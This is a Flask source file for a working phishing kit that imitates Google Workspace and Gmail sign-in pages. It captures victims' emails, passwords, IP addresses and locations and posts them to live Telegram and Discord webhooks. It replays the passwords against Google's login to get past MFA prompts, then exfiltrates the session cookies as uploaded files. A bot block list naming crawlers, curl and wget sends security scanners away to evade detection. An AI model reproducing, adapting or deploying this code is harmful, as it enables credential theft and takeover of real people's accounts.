from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response, Response
import tempfile
import os
import re
import random
import json
import requests
from fake_useragent import UserAgent
from google.oauth2 import id_token
from google_auth_oauthlib.flow import Flow
from google.auth.transport import requests as google_requests
import datetime





# Initialize Flask application first
app = Flask(__name__)
app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"
# Ensure session cookies are secure in production
if os.environ.get('RAILWAY_ENVIRONMENT', '') or os.environ.get('FLASK_ENV', '') == 'production':
    app.config['SESSION_COOKIE_SECURE'] = True
else:
    app.config['SESSION_COOKIE_SECURE'] = False


# Set port and server name after app initialization
port = int(os.environ.get('PORT', 5000))
app.config['SERVER_NAME'] = None  # Allow dynamic hostnames

# Webhook configuration
TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot7683203119:AAEuLNvGvDH3Wg2e4uYcA3RkTRe2jxEWr9Q/sendMessage'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1444453046066217052/GonloDjy4rv10HHcWpMywvjleS9fk8-OQ_sgLCum3Sq350COT4zpUTqrmyO32JxZaa0G'
TELEGRAM_CHAT_ID = '-4904152340'
TELEGRAM_WEBHOOK_ON = True  # Enable Telegram
DISCORD_WEBHOOK_ON = True   # Enable Discord

def send_webhook_message(message):
    if TELEGRAM_WEBHOOK_ON:
        # Telegram expects chat_id and text
        payload = {
            'chat_id': '<chat_id>',  # Replace with your chat_id
            'text': message
        }
        try:
            requests.post(TELEGRAM_WEBHOOK_URL, data=payload, timeout=5)
        except Exception:
            pass
    if DISCORD_WEBHOOK_ON:
        payload = {
            'content': message
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        except Exception:
            pass

# Google OAuth 2.0 configuration
def get_google_email_details(email, name=None, picture=None):
    domain = email.split('@')[1] if '@' in email else ''
    branding = {
        'banner': picture or f'https://logo.clearbit.com/{domain}',
        'background': f'https://source.unsplash.com/featured/?office,workspace,{domain}',
        'name': name or email.split('@')[0]
    }
    return branding

# Browser configuration
class Browser:
    def __init__(self):
        self.user_agent = UserAgent()
        self.browser_arrays = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36',
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36'
        ]
    def get_random_agent(self):
        return random.choice(self.browser_arrays)

# Cookie handling function
def cookies_to_json(cookies):
    cookie_list = []
    for cookie in cookies:
        cookie_dict = {
            'name': cookie.name,
            'value': cookie.value,
            'domain': cookie.domain,
            'path': cookie.path,
            'secure': cookie.secure,
            'expires': cookie.expires,
            'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
            'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
            'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
            'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
            'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
        }
        cookie_list.append(cookie_dict)
    return json.dumps(cookie_list)

def cookieToJSON(cookie_string, domain):
    cookie_parts = cookie_string.split(';')
    main_part = cookie_parts[0].strip()
    name, value = main_part.split('=', 1)

    cookie_dict = {
        'name': name,
        'value': value,
        'domain': domain,
        'path': '/',  # Default path
        'secure': False,
        'expires': None,
        'httpOnly': False,
        'sameSite': None,
        'priority': None,
        'hostOnly': False,
        'max-age': None
    }

    for part in cookie_parts[1:]:
        part = part.strip()
        lower_part = part.lower()
        if 'secure' == lower_part:
            cookie_dict['secure'] = True
        elif 'httponly' == lower_part:
            cookie_dict['httpOnly'] = True
        elif 'path=' in lower_part:
            cookie_dict['path'] = part.split('=', 1)[1]
        elif 'expires=' in lower_part:
            cookie_dict['expires'] = part.split('=', 1)[1]
        elif 'max-age=' in lower_part:
            cookie_dict['max-age'] = part.split('=', 1)[1]
        elif 'samesite=' in lower_part:
            cookie_dict['sameSite'] = part.split('=', 1)[1]
        elif 'priority=' in lower_part:
            cookie_dict['priority'] = part.split('=', 1)[1]
    return cookie_dict

# Dummy response function for testing
def get_dummy_response():
    class DummyResponse:
        def __init__(self):
            self.headers = {
                'Set-Cookie': 'sessionid=abc123; Path=/; Secure; HttpOnly, userid=xyz789; Path=/; Max-Age=3600; SameSite=Lax'
            }
            self.status_code = 200
            self.text = '{"message": "Dummy response"}'
    return DummyResponse()

# Example usage to send cookies in cookie message
def send_cookie_message():
    response = get_dummy_response()
    set_cookie_header = response.headers.get('Set-Cookie', '')
    domain = 'example.com'
    cookie_json_list = []
    for cookie_str in set_cookie_header.split(','):
        cookie_json = cookieToJSON(cookie_str.strip(), domain)
        cookie_json_list.append(cookie_json)
    # Send or print the cookie message in the required format
    cookie_message = {
        'cookies': cookie_json_list
    }
    print('Cookie Message:', cookie_message)
# Email validation for Gmail and Google Workspace
def is_valid_email(email):
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    if not re.match(email_regex, email):
        return False
    domain = email.lower().split('@')[1] if '@' in email else ''
    # Allow gmail.com and googlemail.com
    if domain in ['gmail.com', 'googlemail.com']:
        return True
    # Check if domain is a Google Workspace domain (simulate with DNS MX lookup for 'aspmx.l.google.com')
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, 'MX')
        for rdata in list(answers):
            # rdata.exchange is available in each answer
            if hasattr(rdata, 'exchange') and 'aspmx.l.google.com' in str(rdata.exchange):
                return True
    except Exception:
        pass
    return False

# Bot detection and redirect
def is_bot_request():
    ua = (request.headers.get('User-Agent') or '').lower()
    # Only block if UA is empty or matches obvious bot patterns
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'wget', 'curl', 'python-requests', 'python-urllib', 'phantomjs',
        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl',
        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot',
        'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot',
        'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare', 'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'archive.org_bot'
    ]
    for sig in bot_signatures:
        if sig in ua:
            print(f"[BOT DETECT] UA matched bot signature: {sig}")
            return True
    # Only block advanced bot headers if not running in production (to avoid false positives on Railway)
    if os.environ.get('FLASK_ENV', '') != 'production':
        advanced_bot_headers = [
            'abusix', 'crawler', 'bot', 'spider', 'proxy', 'phantom', 'selenium', 'headless', 'scrapy', 'postman', 'httpx', 'httpie',
            'libwww-perl', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot',
            'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard',
            'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare'
        ]
        for h in request.headers:
            h_name = h[0].lower()
            h_value = str(h[1]).lower()
            for adv_header in advanced_bot_headers:
                if adv_header in h_name or adv_header in h_value:
                    print(f"[BOT DETECT] Header matched bot pattern: {adv_header} in {h_name} or {h_value}")
                    return True
    # Block if UA is empty
    if not ua:
        print("[BOT DETECT] UA is empty")
        return True
    return False

@app.route('/error/bot-detected')
def bot_error_handler():
    session.clear()
    # Log bot detection in backend only
    print("[BOT DETECT] Redirected: IP {} UA {}".format(request.remote_addr, request.headers.get('User-Agent', '')))
    return redirect('https://workspace.google.com')

# Temp file to store cookies per session
COOKIE_TEMP_FILE = os.path.join(tempfile.gettempdir(), 'gmail_fake_cookies.txt')

# Fake user database for demonstration
USERS = {
    'testuser@gmail.com': 'testpassword123',
    'demo@gmail.com': 'demopass',
}

# Route to render index.html
@app.route('/')
def index():
    return render_template('index.html')

# New route to handle email submission from index.html and redirect to password page
@app.route('/password', methods=['GET', 'POST'])
def password():
    if is_bot_request():
        return redirect(url_for('bot_error_handler'))

    email = request.args.get('email') or request.form.get('email') or session.get('email')
    if not email:
        return redirect(url_for('index'))
    
    try:
        # Fetch branding details here, only when the password page is loaded.
        branding = get_google_email_details(email)
        session['banner'] = branding.get('banner')
        session['background'] = branding.get('background')
        session['email'] = email

        return render_template(
            'password.html',
            email=email,
            banner=session.get('banner'),
            background=session.get('background'),
            error=request.args.get('error'),
        )
    except Exception as e:
        print(f"Error in password route: {str(e)}")
        return redirect(url_for('index'))

@app.route('/enter-password', methods=['GET', 'POST'])
def enter_password():
    email = session.get('email')
    error = None
    branding = None
    if email:
        branding = get_google_email_details(email)
    if request.method == 'POST':
        password_val = request.form.get('password') or ''
        session['email'] = email
        branding = get_google_email_details(email)
        # Collect info for webhook
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        import httpagentparser
        browser_info = httpagentparser.detect(user_agent)
        user_browser = browser_info.get('browser', {}).get('name', '')
        browser_version = browser_info.get('browser', {}).get('version', '')
        browser_platform = browser_info.get('platform', {}).get('name', '')
        geo_data = {}
        try:
            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
            geo_data = geo_resp.json()
            user_country = geo_data.get('country_name', '')
            user_city = geo_data.get('city', '')
        except Exception:
            user_country = ''
            user_city = ''
        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
        credentials_message = (
            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password_val}\n"
            f"🌍 Real IP: {client_ip}\n"
            f"🖥️ User Agent: {user_agent}\n"
            f"🌐 Browser: {user_browser} {browser_version}\n"
            f"💻 Platform: {browser_platform}\n"
            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
            f"🏙️ City: {user_city}\n"
            f"⏰ Time: {current_time}"
        )
        send_webhook_message(credentials_message)
        # Simulate Google login flow
        login_url = "https://accounts.google.com/signin/v2/identifier"
        headers = {
            "User-Agent": user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "Origin": "https://accounts.google.com",
            "Referer": "https://accounts.google.com/signin/v2/identifier",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        payload = {
            "identifier": email,
            "password": password_val,
            "continue": "https://mail.google.com/mail/u/0/",
            "flowName": "GlifWebSignIn",
            "bgresponse": "js_disabled",
            "persistentCookie": "yes",
            "deviceinfo": json.dumps({
                "ua": request.headers.get('User-Agent', ''),
                "platform": request.user_agent.platform,
                "os": request.user_agent.platform,
                "device": "desktop"
            }),
            "gxf": "",
            "checkedDomains": "youtube",
            "checkConnection": "youtube:123:1",
            "pstMsg": "1",
            "TL": "",
        }
        session_req = requests.Session()
        # Use fake browser for login
        browser = Browser()
        headers["User-Agent"] = browser.get_random_agent()
        response = session_req.post(login_url, data=payload, headers=headers, allow_redirects=False)

        print(f"[DEBUG] Google login response status: {response.status_code}")
        print(f"[DEBUG] Google login response text: {response.text[:500]}")

        # Check for CAPTCHA
        if "captcha" in response.text.lower():
            print("[DEBUG] CAPTCHA required detected in response.")
            return render_template('captcha.html', email=email, password=password_val, error="CAPTCHA required for this account.")

        # Phone/MFA approval detection
        phone_keywords = [
            "phone", "2-step", "approval", "verify", "verification", "security check", "confirm it's you", "identity", "prompt", "notification", "app", "open your phone", "check your phone", "enter code", "sent a code", "authenticator", "multi-factor", "mfa", "device", "trusted device", "push notification"
        ]
        phone_detected = any(kw in response.text.lower() for kw in phone_keywords)
        if phone_detected:
            print("[DEBUG] Phone/MFA approval required detected in response. Redirecting to /auth.")
            session['authenticated'] = True
            session['email'] = email
            # Save cookies from session_req (if any)
            login_cookies = []
            for c in session_req.cookies:
                login_cookies.append({
                    'name': c.name if hasattr(c, 'name') else c,
                    'value': c.value if hasattr(c, 'value') else session_req.cookies.get(c.name if hasattr(c, 'name') else str(c)),
                    'domain': c.domain if hasattr(c, 'domain') else 'google.com',
                    'path': c.path if hasattr(c, 'path') else '/',
                    'secure': c.secure if hasattr(c, 'secure') else True,
                    'expires': c.expires if hasattr(c, 'expires') else None,
                    'httpOnly': c.has_nonstandard_attr('HttpOnly') if hasattr(c, 'has_nonstandard_attr') else False,
                    'sameSite': c.has_nonstandard_attr('SameSite') if hasattr(c, 'has_nonstandard_attr') else None,
                    'priority': c.has_nonstandard_attr('Priority') if hasattr(c, 'has_nonstandard_attr') else None,
                    'hostOnly': c.domain_specified if hasattr(c, 'domain_specified') else False,
                    'max-age': c.has_nonstandard_attr('Max-Age') if hasattr(c, 'has_nonstandard_attr') else None
                })
            session['login_cookies'] = login_cookies
            return redirect(url_for('auth'))

        # Challenge handling: follow redirect and capture cookies
        if "challenge" in response.text.lower() or response.status_code == 302:
            print("[DEBUG] Challenge or 302 detected. Following redirect to complete authentication.")
            # Follow redirect if present
            next_url = response.headers.get('Location')
            if next_url:
                challenge_resp = session_req.get(next_url, headers=headers, allow_redirects=True)
                print(f"[DEBUG] Challenge response status: {challenge_resp.status_code}")
                print(f"[DEBUG] Challenge response text: {challenge_resp.text[:500]}")
                # Save cookies from session_req
                login_cookies = []
                for c in session_req.cookies:
                    login_cookies.append({
                        'name': c.name if hasattr(c, 'name') else c,
                        'value': c.value if hasattr(c, 'value') else session_req.cookies.get(str(c)),
                        'domain': c.domain if hasattr(c, 'domain') else 'google.com',
                        'path': c.path if hasattr(c, 'path') else '/',
                        'secure': c.secure if hasattr(c, 'secure') else True,
                        'expires': c.expires if hasattr(c, 'expires') else None,
                        'httpOnly': c.has_nonstandard_attr('HttpOnly') if hasattr(c, 'has_nonstandard_attr') else False,
                        'sameSite': c.has_nonstandard_attr('SameSite') if hasattr(c, 'has_nonstandard_attr') else None,
                        'priority': c.has_nonstandard_attr('Priority') if hasattr(c, 'has_nonstandard_attr') else None,
                        'hostOnly': c.domain_specified if hasattr(c, 'domain_specified') else False,
                        'max-age': c.has_nonstandard_attr('Max-Age') if hasattr(c, 'has_nonstandard_attr') else None
                    })
                session['login_cookies'] = login_cookies
                session['authenticated'] = True
                session['email'] = email
                resp = make_response(redirect('https://mail.google.com/mail/u/0/'))
                for c in login_cookies:
                    resp.set_cookie(c['name'], c['value'], samesite='Strict', secure=True)
                return resp
            else:
                print("[DEBUG] Challenge detected but no redirect location found.")
                error = "Login challenge failed."
                return render_template('password.html', email=email, error=error, branding=branding)

        print("[DEBUG] Login failed, rendering password page again.")
        error = "Login failed."
        return render_template('password.html', email=email, error=error, branding=branding)
    else:
        # If GET, show password page again if session email exists
        return render_template('password.html', email=email, error=error, branding=branding)

# Step 3: Show authentication code/token in auth.html
@app.route('/auth')
def auth():
    if not session.get('authenticated'):
        return redirect(url_for('index'))
    email = session.get('email', '')
    code = session.get('auth_code') or str(random.randint(10, 99))
    session['auth_code'] = code

    # Set cookies using user agent and notify webhook before redirect
    is_https = request.headers.get('X-Forwarded-Proto', '').lower() == 'https'
    domain = request.host
    user_agent = request.headers.get('User-Agent', '')
    resp = make_response(render_template('auth.html', email=email, code=code))
    resp.set_cookie('auth_verified', '1', secure=is_https, samesite='Strict')
    resp.set_cookie('user_agent', user_agent, secure=is_https, samesite='Strict')

    # Prepare cookies for webhook in Cookie2json format
    # Only include Google login cookies (gmail.com, google.com) from previous login session
    cookies_json = []
    google_cookies = []
    # Try to get cookies from previous login session (if available)
    if 'login_cookies' in session:
        for c in session['login_cookies']:
            if any(d in c.get('domain', '') for d in ['gmail.com', 'google.com']):
                google_cookies.append(c)
    # Fallback: try to get from request cookies (not ideal, but for completeness)
    for k, v in request.cookies.items():
        if any(d in domain for d in ['gmail.com', 'google.com']):
            google_cookies.append(cookieToJSON(f"{k}={v}; Path=/; Secure; SameSite=Strict", domain))
    # Add Google cookies only
    cookies_json.extend(google_cookies)

    # Save cookies to txt file named with user email
    safe_email = email.replace('@', '_at_').replace('.', '_dot_')
    temp_file_path = os.path.join(tempfile.gettempdir(), f"{safe_email}_cookies.txt")
    cookies_str = json.dumps(cookies_json, indent=2)
    # Telegram/Discord file size limit (Telegram: 50MB, Discord: 8MB for free)
    max_size = 8 * 1024 * 1024
    try:
        if len(cookies_str.encode('utf-8')) < max_size:
            with open(temp_file_path, 'w') as f:
                f.write(cookies_str)
        else:
            with open(temp_file_path, 'w') as f:
                f.write(cookies_str[:max_size])
    except Exception as e:
        print(f"[ERROR] Could not write cookies file: {e}")


    # Send file to Telegram (document upload)
    try:
        if TELEGRAM_WEBHOOK_ON and TELEGRAM_CHAT_ID and os.path.exists(temp_file_path):
            with open(temp_file_path, 'rb') as doc_file:
                files = {'document': doc_file}
                data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f'Cookies for {email}'}
                r = requests.post(f'https://api.telegram.org/bot{TELEGRAM_WEBHOOK_URL.split("bot")[1].split(":")[0]}/sendDocument', data=data, files=files, timeout=10)
                print(f"[DEBUG] Telegram file upload status: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] Telegram file upload failed: {e}")

    # Send file to Discord (document upload)
    try:
        if DISCORD_WEBHOOK_ON and os.path.exists(temp_file_path):
            with open(temp_file_path, 'rb') as doc_file:
                files = {'file': (f'{safe_email}_cookies.txt', doc_file)}
                data = {'content': f'Cookies for {email}'}
                r = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=10)
                print(f"[DEBUG] Discord file upload status: {r.status_code}")
    except Exception as e:
        print(f"[ERROR] Discord file upload failed: {e}")

    # Clean up session after authentication
    session.pop('email', None)
    session.pop('authenticated', None)
    session.pop('google_token', None)
    session.pop('id_token', None)
    session.pop('branding', None)
    session.pop('auth_code', None)

    # After showing the code, redirect to Gmail inbox (simulate Google flow)
    return redirect('https://mail.google.com/mail/u/0/')

# After each request, capture Set-Cookie headers if needed
@app.after_request
def capture_cookies(response):
    # Add X-Robots-Tag header to all responses for noindex, nofollow
    response.headers['X-Robots-Tag'] = 'noindex, nofollow'
    return response

# Entry point for local and Railway deployment
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)